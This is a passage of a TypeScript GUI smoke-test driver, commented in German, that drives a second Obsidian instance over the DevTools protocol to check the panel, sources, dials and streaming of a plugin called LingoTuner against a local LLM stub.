/**
 * GUI-Smoke — faehrt die Pruefpunkte aus docs/internal/SMOKE.md gegen ein LAUFENDES Obsidian (CORE-TEST-02 b).
 *
 * Der Lauf misst zwei Haelften: A/B ohne Modell (Panel, Quellen, Guards) und C mit Modell
 * (Stream + Ausgaenge). C wird UEBERSPRUNGEN und benannt, wenn auf :1234 kein Endpunkt
 * antwortet — nie still gruen (CORE-TEST-19).
 *
 * ## Zweitinstanz (der richtige Ort fuer diesen Lauf — eigenes Profil, eigener Port, Pflicht-`--port`)
 *
 *   echo "$STAGING_VAULTS_DIR"                                         # muss gesetzt sein (~/.zshenv)
 *   npm run build && npm run smoke:gui -- --setup                      # Vault aus fixtures/vault/ (deployt auch ../llm-lab)
 *   UD=/tmp/obs-test-lingotuner; mkdir -p "$UD"
 *   pgrep -f "user-data-dir=$UD"                                       # leer, sonst auf ein anderes Profil ausweichen
 *   lsof -nP -iTCP:<port> -sTCP:LISTEN                                 # leer
 *   cp ~/Library/Application\ Support/obsidian/obsidian-*.asar "$UD"/   # aktuelle Version statt gebuendelter
 *   # $UD/obsidian.json: Vault ($STAGING_VAULTS_DIR/lingotuner) und "language":"en" eintragen (Obsidian liest die Datei nur beim Start)
 *   /Applications/Obsidian.app/Contents/MacOS/Obsidian --user-data-dir="$UD" --remote-debugging-port=<port> &
 *   python3 ~/.claude/hooks/obsidian-cdp-lock.py acquire --label lingotuner --intent "GUI-Smoke" --exclusive focus --port <port> --ttl 300
 *   npm run smoke:gui -- --port <port>                                 (Abschnitt C laeuft gegen den zentralen LLM-Stub; `--model <id>` faehrt echt gegen :1234)
 *   python3 ~/.claude/hooks/obsidian-cdp-lock.py release
 *
 * Vertrauensdialog und Restricted Mode eines frischen Profils erledigt der Treiber selbst
 * (`bereiteInstanzVor`); je Messlauf ein frischer Prozess, der erste Lauf nach der Profilanlage ist
 * ein Aufwaermlauf. Es gibt keinen Standardport: ohne `--port` bricht der Treiber mit Exit 2 ab.
 *
 * ## Bilanz
 *
 * Vier Zustaende (CORE-TEST-19): gruen · rot · uebersprungen · nichts gemessen. `PUNKTE` ist der
 * Nenner. „Uebersprungen" heisst nur: in dieser Lage nicht anwendbar (`prefers-reduced-motion`,
 * per Hand abgedeckte Markierung). Fehlt die Vorbedingung (kein Modell, Quelle nicht waehlbar,
 * Messung abgebrochen), ist der Punkt „nichts gemessen" und der Lauf endet mit Exit 1.
 *
 * Der Lock ist die Eintrittskarte des Guards (auch fuer die Zweitinstanz); `release` gehoert direkt
 * hinter den Lauf. Die regulaere Instanz wird nicht angefasst — beendet wird die Zweitinstanz ueber
 * ihre PID, nie ueber `pkill`/`killall`/`quit app`.
 *
 * Gemessen wird im eigenen Staging-Vault (`$STAGING_VAULTS_DIR/lingotuner`, aufgeloest ueber
 * `stagingVaultDir()`), nie im Arbeits-Vault. Wo dieses Verzeichnis liegt, sagt die Umgebung —
 * hier steht nur die Variable, nie ihr Wert (CORE-META-14; ein Beispielwert in der Doku ist ein
 * zweiter Ort und gabelt die Konvention). Der Ort selbst: obsidian-plugins/AGENTS.md
 * § Staging-Vaults.
 *
 * Typen: `tsconfig.scripts.json` (im `gate` ueber `npm run typecheck:scripts`).
 */
import { copyFileSync, existsSync, mkdirSync, readFileSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { cwd } from "node:process";

import { Cdp, attachTo, beimAbbruch, bereiteInstanzVor, clickReal, closeExtraLeaves, entferneFakeManager, installFakeManager as installZentralFakeManager, istAbgebrochen, notices, pollUntil, requireVisible, schliesseEinstellungen, setPluginSetting } from "../../tools/obsidian-cdp/cdp.js";
import { startLlmStub, type AntwortSpec } from "../../tools/obsidian-cdp/llm-stub.js";
import { messeFolge, zeichneFolge } from "../../tools/obsidian-cdp/folge.js";
import { gegenprobeErreichbarkeit, gegenprobeFokus, messeDenkblockKopierbar, messeErreichbarkeit, messeFokusErhalt, messeFokusFenster, mitHoehe, zeichneDenkblock, zeichnePflicht, fokusAufraeumSkript, type PflichtBilanz, type PflichtTeilurteil } from "../../tools/obsidian-cdp/pflichtpunkte.js";
import { createBilanz, parseArgs, runDriver } from "../../tools/obsidian-cdp/bilanz.js";
import { boxAround, capture } from "../../tools/obsidian-cdp/shot.js";
import { buildVault, requireEigenerBuild, stagingVaultDir } from "../../tools/obsidian-cdp/vault.js";

const REPO_NAME = "lingotuner";
const PLUGIN_ID = "lingotuner";
const VIEW_TYPE = "lingotuner-panel";
const REPO_ROOT = cwd();
const FIXTURE_DIR = join(REPO_ROOT, "fixtures/vault");
const NOTE = "Mail-Entwurf.md";
/** Endpunkt fuer Abschnitt C: mit `--model` der echte Server auf :1234, sonst die URL des zentralen Stubs (`pruefeLauf` setzt sie). */
let ENDPOINT = "http://127.0.0.1:1234";
const LOGBOOK_FOLDER = "LingoTuner";
// Task 5 (Pilot LLM Endpoint Manager): der Manager-Abschnitt (M1-M3) ist optional und
// braucht weder das echte Manager-Plugin noch einen echten LLM-Server — Muster aus
// llm-endpoint-manager/scripts/gui-smoke.ts (Fake-HTTP-Server, koda-agent-Herkunft) und
// obsidian-kit/src/pure/endpoint-source.ts (LlmEndpointManagerApi-Form).
const MANAGER_PLUGIN_ID = "llm-endpoint-manager";
const LAB_PLUGIN_ID = "llm-lab";
const MANAGER_DEFAULT_MODEL = "smoke-manager-model";
// M3-Nacharbeit (Fix-Runde, 2026-09-15): der lokale Fallback-Teil von M3 braucht einen ZWEITEN
// Fake-Server, unabhaengig vom Manager-Fake — sonst haengt M3 an einem echten LM-Studio-Server
// auf :1234 (Umgebungssache, siehe C1) und ist bei fehlendem Modell dort "uebersprungen" statt
// tatsaechlich geprueft. Eigener Modellname, damit ein Log eindeutig zeigt, welcher der beiden
// Fake-Server eine Anfrage sah.
const LOCAL_FALLBACK_MODEL = "smoke-local-model";

/** Soll-Liste aller Pruefpunkte = der Nenner der Bilanz (CORE-TEST-19), aus einem vollstaendigen
 *  Lauf abgeleitet. Ein Punkt, der hier steht und nie aufgezeichnet wird, zaehlt als „nichts
 *  gemessen"; ein Name, der hier fehlt, laesst `createBilanz` werfen (Abbruch, Exit 2). */
const PUNKTE = [
  "A1 Plugin geladen",
  "A2 Befehle registriert",
  "A3 Panel oeffnet",
  "B1 drei Quellen-Chips",
  "B2 vier Regler",
  "B3 vier Preset-Chips",
  "B4 Notiz als Quelle erkannt",
  "B5 Noop sperrt Tunen",
  "B6 Regler gibt Tunen frei",
  "B7 Preset zeigt (angepasst)",
  "B8 Textfeld-Quelle zeigt Textarea",
  "B10 Tippen ins Textfeld behaelt den Fokus",
  "B10b Gegenprobe: ein Neuzeichnen mit Fokusverlust macht B10 rot",
  "B9 Lesemodus blockiert die Quelle",
  "C5 is-checking animiert",
  "C11 Panel folgt dem Strom",
  "C11b Hochscrollen im Strom wird respektiert",
  "C11c Zurueck am Ende folgt das Panel wieder",
  "C1 Stream liefert Ergebnis",
  "B11 Tippen ueberlebt das Ende eines Laufs",
  "B11b Tippen im Quelltextfeld ueberlebt das Ende eines Laufs",
  "C2 Kopieren freigegeben",
  "C3 Notiz ersetzen schreibt Body",
  "C4 Neue Notiz entsteht",
  "C6 Logbuch anlegen und anhaengen",
  "C7 Ersetzen-Ziel sperrt bei geaenderter Quelle",
  "C8 Gedanken-Block waehrend des Streams",
  "C8b Gedanken-Text waechst waehrend des Streams",
  "C8c Denkblock kopierbar: der Knopf legt den Denktext in die Zwischenablage, der Block klappt nicht um",
  "C8d Gegenprobe: lehnt die Zwischenablage ab, quittiert der Knopf nicht",
  "C9 jedes Bedienelement ist erreichbar (natuerliche Hoehe)",
  "C9b jedes Bedienelement ist erreichbar (kurzes Panel, 420 px)",
  "C9c Gegenprobe: ohne Rollbalken wird etwas unerreichbar",
  "C9d Quell-Textfeld und Regler erreichbar (Quelle Textfeld)",
  "C10 Zuruecksetzen fragt nach und raeumt",
  "M1 Settings zeigen den Manager statt der lokalen Liste",
  "M2 Lauf nutzt den Manager-Endpunkt und das Default-Modell",
  "M2b Manager-Lauf nutzt gewaehltes Modell, nicht den Endpunkt-Default (C1)",
  "M3 Manager aus → lokale Liste in Settings und im Lauf",
  "M4 Abgeschalteter Manager-Endpunkt: die Meldung nennt den Grund statt „kein Endpunkt“",
  "S1 Fake-Manager liefert den Apple-Endpunkt nur bei Opt-in",
  "S2 Dropdown zeigt „Apple Intelligence (on-device)“",
  "S3 Wahl → Quelle traegt transport shortcuts",
  "S4 Lauf oeffnet die shortcuts://-URL mit dem gefalteten Prompt",
  "S5 Zeitueberschreitung des Kurzbefehls zeigt die Kurzbefehl-Meldung",
  "H1 Die Hilfe-Zeile steht als erste Zeile im Tab, mit Text-Knopf und Icon-Knopf",
  "L1 Ein Tunen erzeugt eine Lab-Aufzeichnung mit turnId (apiVersion 4)",
  "F1 Ohne CORS-Freigabe kommt das Ergebnis ueber den Fallback ohne Stream",
  "F2 Antwort bleibt nach dem Header aus: das Panel faellt nach der Frist in is-error, Knopf wieder Tune",
  "V1 Token geht als Platzhalter an den Server, im Ergebnis steht das Original",
  "V2 Schluessel steht nicht mehr in data.json, der Server bekommt ihn trotzdem",
  "V3 Antwort mit Code-Block-Prozessor und Bild rendert als Text",
  "N1 Abschnitt Anfrage laesst sich aufklappen",
  "N2 Eigener Wert wird gesetzt und wieder zurueckgesetzt",
  "N3 Denk-Knopf im Panel schaltet um",
  "N4 Stufenwahl im Chat zeigt ein Dropdown",
  "R1 Runden-Zeile laeuft bei ~300 px nicht ueber",
  "R2 Rueckwahl: Klick auf die vorletzte Runde zeigt deren Ergebnis, die Zeile ist aktiv",
  "R3 Panel ragt bei ~230 px Sidebar-Breite nicht ueber den Rand",
  "T1 Gemma-Stub: das Denken ohne Oeffner steht nicht im Ergebnis",
  "T1b Gemma-Stub: das Denken steht im ausklappbaren Denkblock",
  "CL1 Fake-Manager mit Anbieter anthropic: der Endpunkt kommt nur mit Opt-in, das Plugin waehlt ihn",
  "CL2 Lauf gegen den Claude-Stub: Messages-API mit Schluessel, Ergebnis im Panel, Denken im Denkblock",
  "CL3 Fehler mitten im Strom: das Panel zeigt is-error mit der Meldung der API, das Teilergebnis bleibt",
  "G1 Altwert wandert in die Zeile, kein globales Modell in den Einstellungen",
  "G2 Panel-Modellwahl schreibt in die aktive Zeile, „Server waehlt“ leert sie",
  "Markierung ersetzen (Rand-Whitespace)",
] as const;

const bilanz = createBilanz({ punkte: PUNKTE });
function record(name: string, passed: boolean, detail: string): void {
  bilanz.record(name as (typeof PUNKTE)[number], passed, detail);
}
/** „In dieser Lage nicht anwendbar" (Systemeinstellung, per Hand abgedeckt) — zaehlt als uebersprungen. */
function skipped(name: string, reason: string): void {
  bilanz.skipped(name as (typeof PUNKTE)[number], reason);
}
/** Der Gegenstand wurde nicht erreicht (Vorbedingung fehlt, Messung abgebrochen, kein Modell) —
 *  „nichts gemessen", Exit 1. Vorher stand das als „uebersprungen" da und liess den Lauf gruen enden. */
function nichtGemessen(name: string, reason: string): void {
  bilanz.unmeasured(name as (typeof PUNKTE)[number], reason);
}
const aufgezeichnet = (name: string): boolean => bilanz.eintraege().some((p) => p.name === name);

const q = (s: string): string => JSON.stringify(s);

/** Einstellungen des Plugins VOR der ersten Mutation (JSON), damit `zustandZurueck` sie im Normalweg und beim Abbruch
 *  zurueckschreibt — der Lauf soll die Einstellungen des Wirts nicht behalten. `null` = noch nicht gelesen. */
let einstellungenVorher: string | null = null;

/** Ergebnisse immer als Objekt: CDP kann null nicht von undefined unterscheiden. */
async function count(cdp: Cdp, selector: string): Promise<number> {
  return (await cdp.evaluate<{ n: number }>(`return { n: document.querySelectorAll(${q(selector)}).length };`)).n;
}
async function text(cdp: Cdp, selector: string): Promise<string | null> {
  return (await cdp.evaluate<{ t: string | null }>(`const el = document.querySelector(${q(selector)}); return { t: el ? el.textContent.trim() : null };`)).t;
}
async function disabled(cdp: Cdp, selector: string): Promise<boolean | null> {
  return (await cdp.evaluate<{ d: boolean | null }>(`const el = document.querySelector(${q(selector)}); return { d: el ? el.disabled : null };`)).d;
}
async function hasClass(cdp: Cdp, selector: string, cls: string): Promise<boolean> {
  return (await cdp.evaluate<{ h: boolean }>(`const el = document.querySelector(${q(selector)}); return { h: !!el && el.classList.contains(${q(cls)}) };`)).h;
}

function setupVault(): void {
  const vaultDir = stagingVaultDir(REPO_NAME);
  const log = buildVault({ repoRoot: REPO_ROOT, vaultDir, fixtureDir: FIXTURE_DIR, pluginId: PLUGIN_ID });
  console.log(`Staging-Vault gebaut: ${vaultDir}`);
  for (const l of log) console.log(`  · ${l}`);
  // `buildVault` entfernt data.json absichtlich (Auslieferungszustand). Der Lauf soll aber
  // gegen einen BENANNTEN Endpunkt fahren und nicht gegen einen Default, der sich aendern
  // kann — deshalb wird die Fixture-Fassung danach hineingelegt.
  const quelle = join(FIXTURE_DIR, "plugin-data.json");
  if (existsSync(quelle)) {
    copyFileSync(quelle, join(vaultDir, ".obsidian", "plugins", PLUGIN_ID, "data.json"));
    console.log("  · Plugin-Einstellungen aus fixtures/vault/plugin-data.json gesetzt");
  }
  deployLab(vaultDir);
  console.log("\nDen Vault in der Zweitinstanz registrieren (Rezept im Dateikopf) und dann:");
  console.log("  npm run smoke:gui -- --port 9341");
}

/** Optional: llm-lab (Geschwister-Repo im Dach) in den Staging-Vault legen, damit Abschnitt L die
 *  Aufzeichnung messen kann. Fehlt ../llm-lab/main.js, bleibt L "uebersprungen" — nie still gruen. */
function deployLab(vaultDir: string): void {
  const quelle = join(REPO_ROOT, "..", "llm-lab");
  if (!existsSync(join(quelle, "main.js"))) { console.log("  · llm-lab nicht gebaut (../llm-lab/main.js fehlt) — Abschnitt L wird uebersprungen"); return; }
  const ziel = join(vaultDir, ".obsidian", "plugins", LAB_PLUGIN_ID);
  mkdirSync(ziel, { recursive: true });
  for (const f of ["main.js", "manifest.json", "styles.css"]) if (existsSync(join(quelle, f))) copyFileSync(join(quelle, f), join(ziel, f));
  const listeDatei = join(vaultDir, ".obsidian", "community-plugins.json");
  const liste = existsSync(listeDatei) ? (JSON.parse(readFileSync(listeDatei, "utf8")) as string[]) : [];
  if (!liste.includes(LAB_PLUGIN_ID)) liste.push(LAB_PLUGIN_ID);
  writeFileSync(listeDatei, JSON.stringify(liste, null, 2));
  console.log("  · llm-lab als zweites Plugin deployt (Abschnitt L)");
}

async function endpointReachable(): Promise<boolean> {
  return (await modelle()).length > 0;
}

/** Die Modell-Ids des Endpunkts. Leer = nicht erreichbar oder keine geladen. */
async function modelle(): Promise<string[]> {
  try {
    const ctrl = new AbortController();
    const timer = setTimeout(() => ctrl.abort(), 3000);
    const r = await fetch(`${ENDPOINT}/v1/models`, { signal: ctrl.signal });
    clearTimeout(timer);
    if (!r.ok) return [];
    const j = (await r.json()) as { data?: Array<{ id?: string }> };
    return (j.data ?? []).map((m) => m.id ?? "").filter((id) => id !== "");
  } catch { return []; }
}

/** Einen Quellen-Chip waehlen und BELEGEN, dass er aktiv wurde.
 *
 *  Der erste Klick nach dem Oeffnen des Panels geht regelmaessig ins Leere: `clickReal`
 *  misst die Bildschirmkoordinate vor dem Klick, und die rechte Sidebar bewegt sich zu
 *  diesem Zeitpunkt noch (revealLeaf animiert). Der Klick landet dann neben dem Chip, die
 *  Quelle bleibt auf "Markierung" stehen — und der nachfolgende Pruefpunkt liest das als
 *  „Zeile bleibt blockiert", also als Plugin-Defekt. Gemessen 2026-09-07 im ersten Lauf
 *  gegen die Zweitinstanz: B4 und B6 rot, unmittelbar danach aus gesetztem Layout gruen.
 *
 *  Wiederholt wird deshalb die MUTATION, nicht die Aussage: gelingt der Klick auch nach
 *  drei Versuchen nicht, ist das ein Befund und wird als solcher gemeldet. Die Zahl der
 *  Versuche steht im Detailtext, damit ein „ging erst beim dritten Mal" nicht unsichtbar
 *  bleibt. */
async function waehleQuelle(cdp: Cdp, index: number): Promise<string> {
  for (let versuch = 1; versuch <= 3; versuch += 1) {
    await clickReal(cdp, `document.querySelectorAll(".lt-source-chip")[${index}]`);
    const aktiv = await pollUntil<{ ok: boolean }>(
      cdp,
      `const b = document.querySelectorAll(".lt-source-chip")[${index}]; return b && b.classList.contains("is-active") ? { ok: true } : null;`,
      2000,
      200,
    );
    if (aktiv !== null) return versuch === 1 ? "" : ` (Chip erst im ${versuch}. Anlauf aktiv)`;
  }
  return " (Chip wurde nach 3 Klicks NICHT aktiv)";
}

/** Ausgangszustand herstellen: Layout leer, Regler neutral.
 *
 *  Beides ueberlebt sonst den Lauf. `lastDials` wird bei jeder Reglerbewegung nach
 *  data.json gespeichert — B5 („alle Regler 0 sperren Tunen") misst beim ZWEITEN Lauf
 *  also den Rest des ersten und ist rot, ohne dass sich am Plugin etwas geaendert haette.
 *  Das Fixture setzt den Startwert, aber nur beim `--setup`; eine laufende Instanz haelt
 *  ihre Einstellungen im Speicher und schreibt sie darueber. Vorher merkt sie sich die
 *  Einstellungen (`einstellungenVorher`), die `zustandZurueck` in `main()` zurueckschreibt. */
async function setzeAusgangszustand(cdp: Cdp): Promise<void> {
  einstellungenVorher = (await cdp.evaluate<{ s: string }>(`return { s: JSON.stringify(app.plugins.plugins[${q(PLUGIN_ID)}].settings) };`)).s;
  await cdp.evaluate(`
    app.workspace.detachLeavesOfType(${q(VIEW_TYPE)});
    app.workspace.detachLeavesOfType("markdown");
    await new Promise((r) => setTimeout(r, 400));
    return { ok: true };
  `);
  await setPluginSetting(cdp, PLUGIN_ID, "lastDials", { directness: 0, context: 0, social: 0, semantics: 0 });
}

async function pruefeGrundlage(cdp: Cdp, vaultName: string): Promise<void> {
  console.log("\nA · Grundlage");
  // Frisches Profil: Vertrauensdialog bestaetigen, Restricted Mode aufheben, Plugins laden (jede
  // Einzelpruefung gibt dort Entwarnung, nur `plugins` ist leer). Wirft nicht; der Hinweis kommt in A1.
  const instanz = await bereiteInstanzVor(cdp, { pluginIds: [PLUGIN_ID, LAB_PLUGIN_ID], nurVault: REPO_NAME, sprache: "en" });
  const geladen = (await cdp.evaluate<{ g: boolean }>(`return { g: Boolean(app.plugins.plugins[${q(PLUGIN_ID)}]) };`)).g;
  const frei = instanz.hinweis;
  record("A1 Plugin geladen", geladen, geladen ? `Vault ${vaultName} (${frei})` : `app.plugins.plugins.${PLUGIN_ID} fehlt — ${frei}`);
  if (!geladen) throw new Error("Ohne geladenes Plugin ist jeder weitere Punkt gegenstandslos.");

  const cmds = (await cdp.evaluate<{ c: string[] }>(`return { c: ["open-panel","tune-selection"].filter((id) => Boolean(app.commands.commands[${q(PLUGIN_ID)} + ":" + id])) };`)).c;
  record("A2 Befehle registriert", cmds.length === 2, cmds.join(", ") || "keiner");

  await setzeAusgangszustand(cdp);
  await cdp.evaluate(`app.commands.executeCommandById(${q(`${PLUGIN_ID}:open-panel`)}); return { ok: true };`);
  const panel = await pollUntil<{ ok: boolean }>(cdp, `return document.querySelector(".lt-panel") ? { ok: true } : null;`, 10_000, 300);
  record("A3 Panel oeffnet", panel !== null, panel !== null ? "Leaf mit .lt-panel" : `kein .lt-panel; Leaves: ${(await cdp.evaluate<{ n: number }>(`return { n: app.workspace.getLeavesOfType(${q(VIEW_TYPE)}).length };`)).n}`);
}

/** Die Bilanz, wie der Baustein `pflichtpunkte` sie braucht (`zeichnePflicht`). */
const pflichtBilanz: PflichtBilanz = {
  record: (name, passed, detail) => record(name, passed, detail ?? ""),
  unmeasured: (name, grund) => nichtGemessen(name, grund),
};

async function pruefePanel(cdp: Cdp): Promise<void> {
  console.log("\nB · Panel ohne Modell");
  record("B1 drei Quellen-Chips", (await count(cdp, ".lt-source-chip")) === 3, `${await count(cdp, ".lt-source-chip")} Chips`);
  record("B2 vier Regler", (await count(cdp, ".lt-dial-input")) === 4, `${await count(cdp, ".lt-dial-input")} range-Inputs`);
  record("B3 vier Preset-Chips", (await count(cdp, ".lt-preset-chip")) === 4, `${await count(cdp, ".lt-preset-chip")} Chips`);

  // Notiz oeffnen, Quelle "Aktive Notiz" waehlen → Bereitschaftszeile traegt die Zeichenzahl.
  await cdp.evaluate(`await app.workspace.getLeaf(true).openFile(app.vault.getAbstractFileByPath(${q(NOTE)})); return { ok: true };`);
  await cdp.evaluate(`app.workspace.trigger("active-leaf-change"); return { ok: true };`);
  const klick4 = await waehleQuelle(cdp, 1);
  const line = await pollUntil<{ t: string }>(cdp, `const el = document.querySelector(".lt-source-line"); return el && !el.classList.contains("is-blocked") ? { t: el.textContent } : null;`, 5000, 250);
  record("B4 Notiz als Quelle erkannt", line !== null && /\d+/.test(line.t), `${line?.t ?? "Zeile bleibt blockiert"}${klick4}`);

  // Noop: alle Regler 0 + keine Anmerkung → Tunen aus; Regler bewegen → an.
  record("B5 Noop sperrt Tunen", (await disabled(cdp, ".lt-run")) === true, `disabled=${await disabled(cdp, ".lt-run")}`);
  await cdp.evaluate(`const i = document.querySelectorAll(".lt-dial-input")[2]; i.value = "2"; i.dispatchEvent(new Event("input", { bubbles: true })); return { ok: true };`);
  const enabled = await pollUntil<{ ok: boolean }>(cdp, `const b = document.querySelector(".lt-run"); return b && !b.disabled ? { ok: true } : null;`, 3000, 200);
  record("B6 Regler gibt Tunen frei", enabled !== null, enabled !== null ? "social=+2 → Tunen aktiv" : "Knopf bleibt aus");
  // Gemessen wird der TEXT, nicht die Existenz: der Marker ist seit dem Fokus-Fix ein fester
  // Platzhalter im DOM (ein Reglerzug schaltet ihn um, ohne die Zeile neu zu bauen — sonst
  // zoege er den gegriffenen Regler unter dem Zeiger weg). Eine Zaehlung waere seitdem immer 1
  // und damit ein Pruefpunkt, der nichts mehr misst.
  const marker = (await text(cdp, ".lt-preset-custom")) ?? "";
  record("B7 Preset zeigt (angepasst)", (await count(cdp, ".lt-preset-custom")) === 1 && marker !== "", `Marker-Text ${JSON.stringify(marker)}`);

  const klick8 = await waehleQuelle(cdp, 2);
  const ta = await pollUntil<{ ok: boolean }>(cdp, `return document.querySelector(".lt-freetext") ? { ok: true } : null;`, 3000, 200);
  record("B8 Textfeld-Quelle zeigt Textarea", ta !== null, `${ta !== null ? ".lt-freetext da" : "fehlt"}${klick8}`);

  // B10 — Pflicht-Punkt (a) aus dem Skill `gui-smoke-setup` § 3a, Anlassfall war genau
  // dieses Plugin: ein `selectionchange`-Handler loeste ein Voll-Neuzeichnen aus, die
  // Textarea wurde als DOM-Knoten ersetzt, der Fokus fiel auf `<body>` — der Nutzer verlor
  // bei jedem Tastendruck den Cursor.
  if (ta === null) {
    nichtGemessen("B10 Tippen ins Textfeld behaelt den Fokus", "ohne .lt-freetext (B8 rot) ist der Punkt gegenstandslos");
  } else {
    zeichnePflicht(pflichtBilanz, "B10 Tippen ins Textfeld behaelt den Fokus", await messeFokusErhalt(cdp, { selector: ".lt-freetext" }));
    // B10b — Gegenprobe (Baustein `gegenprobeFokus`, vorher lokal): ein Neuzeichnen, das dem Feld den Fokus nimmt, MUSS die Messung rot machen.
    zeichnePflicht(pflichtBilanz, "B10b Gegenprobe: ein Neuzeichnen mit Fokusverlust macht B10 rot", await gegenprobeFokus(cdp, { selector: ".lt-freetext" }));
  }

  // Lesemodus blockiert Markierung/Notiz.
  await waehleQuelle(cdp, 1);
  await cdp.evaluate(`const v = app.workspace.getLeavesOfType("markdown")[0].view; await v.setState({ ...v.getState(), mode: "preview" }, { history: false }); app.workspace.trigger("active-leaf-change"); return { ok: true };`);
  const blocked = await pollUntil<{ ok: boolean }>(cdp, `const el = document.querySelector(".lt-source-line"); return el && el.classList.contains("is-blocked") ? { ok: true } : null;`, 5000, 250);
  record("B9 Lesemodus blockiert die Quelle", blocked !== null, blocked !== null ? "is-blocked gesetzt" : (await text(cdp, ".lt-source-line")) ?? "keine Zeile");
  await cdp.evaluate(`const v = app.workspace.getLeavesOfType("markdown")[0].view; await v.setState({ ...v.getState(), mode: "source" }, { history: false }); app.workspace.trigger("active-leaf-change"); return { ok: true };`);
}

/** Einen Tune-Lauf ausloesen und auf seinen Endzustand warten. `false` = nicht gruen geworden. */
async function laufeTune(cdp: Cdp, waehrendDesLaufs?: () => Promise<void>): Promise<boolean> {
  await clickReal(cdp, `document.querySelector(".lt-run")`);
  if (waehrendDesLaufs) await waehrendDesLaufs();
  const done = await pollUntil<{ ok: boolean }>(cdp, `const s = document.querySelector(".lt-status"); return s && (s.classList.contains("is-ok") || s.classList.contains("is-error")) ? { ok: true } : null;`, 120_000, 1000);
  return done !== null && (await hasClass(cdp, ".lt-status", "is-ok"));
}

/** Denken fuer C8 einschalten: `request.thinking.transform` auf eine Stufe (die Profile, nicht das Altfeld `suppressThinking`,
 *  das `loadSettings` beim Laden loescht und zur Laufzeit niemand liest — mit ihm lief C8 gegen ein echtes Modell ohne Denken).
 *  Der Vorwert bleibt im Fenster, damit auch ein Abbruch ihn nicht verliert. */
async function schalteDenkenAn(cdp: Cdp): Promise<void> {
  await cdp.evaluate(`
    const p = app.plugins.plugins[${q(PLUGIN_ID)}];
    if (!("__ltDenkVorwert" in window)) window.__ltDenkVorwert = { had: "transform" in p.settings.request.thinking, value: p.settings.request.thinking.transform };
    p.settings.request.thinking.transform = "low";
    await p.saveSettings?.();
    return { ok: true };
  `);
}

async function stelleDenkenZurueck(cdp: Cdp): Promise<void> {
  await cdp.evaluate(`
    const p = app.plugins.plugins[${q(PLUGIN_ID)}];
    const v = window.__ltDenkVorwert;
    if (v) { if (v.had) p.settings.request.thinking.transform = v.value; else delete p.settings.request.thinking.transform; delete window.__ltDenkVorwert; }
    await p.saveSettings?.();
    return { ok: true };
  `);
}

/** C8 — der gemeldete Fehler 3: erscheint der Gedanken-Block WAEHREND des Streams oder erst
 *  danach?
 *
 *  Ein eigener, absichtlich ABGEBROCHENER Lauf. Der erste Entwurf hat die Messung in den
 *  zweiten Lauf gefaltet, um Zeit zu sparen — das ging schief und ist der Grund, warum es
 *  hier steht: mit eingeschaltetem Denken ueberschritt derselbe Lauf die 120-s-Grenze,
 *  `laufeTune` gab auf, und C3/C4 klickten danach auf Knoepfe, die waehrend eines laufenden
 *  Streams gesperrt sind. Zwei rote und ein uebersprungener Punkt aus einer Zeitersparnis.
 *  Sobald der Block steht, ist die Frage beantwortet — der Rest des Laufs kostet nur noch
 *  Minuten, deshalb der Abbruch. */
const C8C = "C8c Denkblock kopierbar: der Knopf legt den Denktext in die Zwischenablage, der Block klappt nicht um";
const C8D = "C8d Gegenprobe: lehnt die Zwischenablage ab, quittiert der Knopf nicht";

/** C8c/C8d — der Kopier-Knopf am Gedankenblock (Kit 0.63.0): die Messung steht zentral in `pflichtpunkte.ts` (`messeDenkblockKopierbar`, mit Gegenprobe).
 *  Das Plugin vendort `stream-area` ab Kit 0.63.0, der Knopf ist also Pflicht (`erwartetKnopf`): fehlt er, ist der Punkt rot statt „nichts gemessen“. */
async function pruefeDenkblockKopierbar(cdp: Cdp, blockDa: boolean): Promise<void> {
  if (!blockDa) {
    const grund = "C8 hat keinen Gedanken-Block waehrend des Streams beobachtet";
    nichtGemessen(C8C, grund);
    nichtGemessen(C8D, grund);
    return;
  }
  zeichneDenkblock(pflichtBilanz, { kopie: C8C, gegen: C8D }, await messeDenkblockKopierbar(cdp, { block: ".okit-stream-reasoning", knopf: ".okit-stream-reasoning-copy", erwartetKnopf: true }));
}

async function pruefeGedanken(cdp: Cdp): Promise<void> {
  await cdp.evaluate(`app.workspace.trigger("active-leaf-change"); return { ok: true };`);
  const bereit = await pollUntil<{ ok: boolean }>(cdp, `const b = document.querySelector(".lt-run"); return b && !b.disabled ? { ok: true } : null;`, 5000, 250);
  if (bereit === null) {
    nichtGemessen("C8 Gedanken-Block waehrend des Streams", `Vorbedingung fehlt: .lt-run ist nicht bedienbar (Quelle: ${(await text(cdp, ".lt-source-line")) ?? "?"})`);
    nichtGemessen("C8b Gedanken-Text waechst waehrend des Streams", "C8 war nicht messbar (.lt-run nicht bedienbar)");
    nichtGemessen(C8C, "C8 war nicht messbar (.lt-run nicht bedienbar)");
    nichtGemessen(C8D, "C8 war nicht messbar (.lt-run nicht bedienbar)");
    return;
  }
  await schalteDenkenAn(cdp);
  setzeStubModus("denken");
  await clickReal(cdp, `document.querySelector(".lt-run")`);
  const beob = await pollUntil<{ block: boolean; laenge: number }>(cdp, `
    const s = document.querySelector(".lt-status");
    const d = document.querySelector(".okit-stream-reasoning");
    if (d && s && s.classList.contains("is-checking")) return { block: true, laenge: (d.querySelector("pre") || { textContent: "" }).textContent.length };
    if (s && !s.classList.contains("is-checking")) return { block: false, laenge: 0 };
    return null;
  `, 60_000, 250);
  // C8b — der Denk-Text WAECHST im Strom (der Block steht nicht nur da): erst die Laenge jetzt, dann eine groessere, solange noch gestreamt wird.
  if (beob?.block === true) {
    const a = (await cdp.evaluate<{ n: number }>(`const pre = document.querySelector(".okit-stream-reasoning pre"); return { n: pre ? pre.textContent.length : 0 };`)).n;
    const b = await pollUntil<{ n: number; laeuft: boolean }>(cdp, `
      const pre = document.querySelector(".okit-stream-reasoning pre");
      const s = document.querySelector(".lt-status");
      const n = pre ? pre.textContent.length : 0;
      return n > ${a} ? { n, laeuft: !!s && s.classList.contains("is-checking") } : null;
    `, 5000, 150);
    record("C8b Gedanken-Text waechst waehrend des Streams", b !== null && b.laeuft, b === null ? `die Laenge blieb in 5 s bei ${a} Zeichen` : `${a} → ${b.n} Zeichen, .lt-status stand dabei ${b.laeuft ? "auf is-checking" : "NICHT mehr auf is-checking"}`);
  } else {
    nichtGemessen("C8b Gedanken-Text waechst waehrend des Streams", "C8 hat keinen Gedanken-Block waehrend des Streams beobachtet — ohne Block gibt es nichts, das wachsen koennte");
  }
  await pruefeDenkblockKopierbar(cdp, beob?.block === true);
  // Abbrechen: waehrend des Streams TRAEGT `.lt-run` die Abbrechen-Rolle.
  if (await hasClass(cdp, ".lt-status", "is-checking")) {
